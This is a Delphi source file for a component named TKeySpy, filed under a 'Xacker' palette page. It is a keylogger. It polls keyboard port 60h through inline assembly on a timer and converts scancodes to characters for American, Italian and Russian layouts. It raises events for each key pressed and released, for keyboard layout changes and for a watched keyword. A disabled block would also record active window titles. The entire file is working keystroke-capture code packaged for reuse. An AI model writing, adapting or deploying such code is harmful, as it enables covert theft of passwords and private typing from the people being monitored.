unit KeySpy;

interface

uses
  {$IFDEF WIN32} Windows, {$ELSE} WinTypes, WinProcs,{$ENDIF}
  SysUtils, Controls, Classes, Messages, Forms;

type
  TSpyLayout = (klAmerican, klItalian, klRussian);
  TOnKeySpy = procedure(Sender: TObject; Key: Byte; KeyStr: String) of object;
  {$IFDEF Win32}
  TOnLayoutChanged = procedure(Sender: TObject; Layout: String) of object;  
  {$ENDIF}
  TOnActiveWindowChanged = procedure(Sender: TObject; ActiveTitle: String) of object;
  TKeySpy = class(TComponent)
  private
    {$IFDEF Win32}
    CurrentLayout: String;
    FActiveLayout: String;
    {$ENDIF}
    CurrentActiveWindowTitle: String;
    FActiveWindowTitle: String;
    FSpyLayout: TSpyLayout;
    FWindowHandle: HWnd;
    FOnKeySpyDown, FOnKeySpyUp: TOnKeySpy;
    FOnKeyword: TNotifyEvent;
    {$IFDEF Win32}
    FOnLayoutChanged: TOnLayoutChanged;
    {$ENDIF}
    FOnActiveWindowChanged: TOnActiveWindowChanged;
    FEnabled: Boolean;
    FKeyword,
    KeyComp: String;

    OldKey: Byte;
    LShiftUp, RShiftUp: Boolean;
    procedure UpdateTimer;
    procedure SetEnabled(Value: Boolean);
    procedure WndProc(var Msg: TMessage);
    procedure SetNothingStr(Value: String);
  protected
    procedure KeySpy; dynamic;
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
  published
    property ActiveWindowTitle: String read FActiveWindowTitle write SetNothingStr;
    property Enabled: Boolean read FEnabled write SetEnabled;
    property Keyword: String read FKeyword write FKeyword;
    property SpyLayout: TSpyLayout read FSpyLayout write FSpyLayout;
    {$IFDEF Win32}
    property ActiveLayout: String read FActiveLayout write FActiveLayout;
    {$ENDIF}
    property OnKeySpyDown: TOnKeySpy read FOnKeySpyDown write FOnKeySpyDown;
    property OnKeySpyUp: TOnKeySpy read FOnKeySpyUp write FOnKeySpyUp;
    property OnKeyword: TNotifyEvent read FOnKeyword write FOnKeyword;
    {$IFDEF Win32}
    property OnLayoutChanged: TOnLayoutChanged read FOnLayoutChanged write FOnLayoutChanged;
    {$ENDIF}
    property OnActiveTitleChanged: TOnActiveWindowChanged read FOnActiveWindowChanged write FOnActiveWindowChanged;
  end;

procedure Register;

implementation

{$I KLayouts.inc}

constructor TKeySpy.Create(AOwner: TComponent);
begin
  inherited Create(AOwner);
  LShiftUp := True;
  RShiftUp := True;
  FEnabled := True;
  FWindowHandle := AllocateHWnd(WndProc);
  if FEnabled then UpdateTimer;
end;

destructor TKeySpy.Destroy;
begin
  FEnabled := False;
  UpdateTimer;
  DeallocateHWnd(FWindowHandle);
  inherited Destroy;
end;

procedure TKeySpy.WndProc(var Msg: TMessage);
begin
  with Msg do
    if Msg = WM_TIMER then
      try
        KeySpy;
      except
        Application.HandleException(Self);
      end
    else
      Result := DefWindowProc(FWindowHandle, Msg, wParam, lParam);
end;

procedure TKeySpy.UpdateTimer;
var
  b: Byte;
begin
  KillTimer(FWindowHandle, 1);
  if FEnabled then
   begin
    asm
      mov al, 60h
      mov b, al
    end;
    OldKey := b;
    if SetTimer(FWindowHandle, 15, 1, nil) = 0 then
      {do nothing}begin end;//raise EOutOfResources.Create('No timers');
   end;
end;

procedure TKeySpy.SetEnabled(Value: Boolean);
begin
  if Value <> FEnabled then
  begin
    FEnabled := Value;
    UpdateTimer;
  end;
end;

procedure TKeySpy.KeySpy;
var
  PC: Array[0..$FFF] of Char;
  Key: Byte;
  St: String;
  Wnd: hWnd;
begin
(*  {$IFDEF Win32}
  Wnd := GetForegroundWindow;
  {$ELSE}
  Wnd := GetActiveWindow;
  {$ENDIF}
  SendMessage(Wnd, wm_GetText, $FFF, LongInt(@PC));
  FActiveWindowTitle := StrPas(PC);
  if CurrentActiveWindowTitle <> FActiveWindowTitle then
   begin
    CurrentActiveWindowTitle := FActiveWindowTitle;
    if Assigned(FOnActiveWindowChanged) then
     FOnActiveWindowChanged(Self, FActiveWindowTitle);
   end;
*)
  {$IFDEF Win32}
  GetKeyboardLayoutName(PC);
  FActiveLayout := StrPas(PC);
  if (FActiveLayout <> CurrentLayout) then
   begin
    CurrentLayout := FActiveLayout;
    if Assigned(FOnLayoutChanged) then
     FOnLayoutChanged(Self, FActiveLayout);
   end;
  {$ENDIF}

  asm
    in al, 60h
    mov Key, al
  end;
  if Key = 170 then
   begin
    Key := 84;
    LShiftUp := True;
   end;
  if Key = 182 then
   begin
    Key := 85;
    RShiftUp := True;
   end;
  if Key = 42 then LShiftUp := False;
  if Key = 54 then RShiftUp := False;
  if Key <> OldKey then
   begin
    OldKey := Key;
    if Key <= 88 then
      begin
       case FSpyLayout of
         klAmerican: if LShiftUp and RShiftUp then
                      St := StrPas(LowButtonName[Key])
                     else
                      St := StrPas(HiButtonName[Key]);
         klItalian: if LShiftUp and RShiftUp then
                     St := StrPas(ItalianLowButtonName[Key])
                    else
                     St := StrPas(ItalianHiButtonName[Key]);
         klRussian: if LShiftUp and RShiftUp then
                     St := StrPas(RussianLowButtonName[Key])
                    else
                     St := StrPas(RussianHiButtonName[Key]);
        end;
       if Assigned(FOnKeySpyDown) then
        FOnKeySpyDown(Self, Key, St);

       if Assigned(FOnKeyword) then
        begin
         KeyComp := KeyComp + St;
         if Length(KeyComp) > Length(FKeyword) then
          begin
           Move(KeyComp[Length(St) + 1], KeyComp[1], Length(KeyComp));
           {$IFDEF WIN32}
           SetLength(KeyComp, Length(FKeyword));
           {$ELSE}
           KeyComp[0] := char(Length(FKeyword));
           {$ENDIF}
          end;
         if KeyComp = FKeyword then
          FOnKeyword(Self);
        end;
      end
    else
     if Key - 128 <= 88 then
      begin
       case FSpyLayout of
         klAmerican: if LShiftUp and RShiftUp then
                      St := StrPas(LowButtonName[Key - 128])
                     else
                      St := StrPas(HiButtonName[Key - 128]);
         klItalian: if LShiftUp and RShiftUp then
                     St := StrPas(ItalianLowButtonName[Key - 128])
                    else
                     St := StrPas(ItalianHiButtonName[Key - 128]);
         klRussian: if LShiftUp and RShiftUp then
                      St := StrPas(RussianLowButtonName[Key - 128])
                     else
                      St := StrPas(RussianHiButtonName[Key - 128]);
        end;
       if Assigned(FOnKeySpyUp) then
        FOnKeySpyUp(Self, Key, St)
      end;
   end;
end;

procedure TKeySpy.SetNothingStr(Value: String); begin {} end;

procedure Register;
begin
  RegisterComponents('Xacker', [TKeySpy]);
end;

end.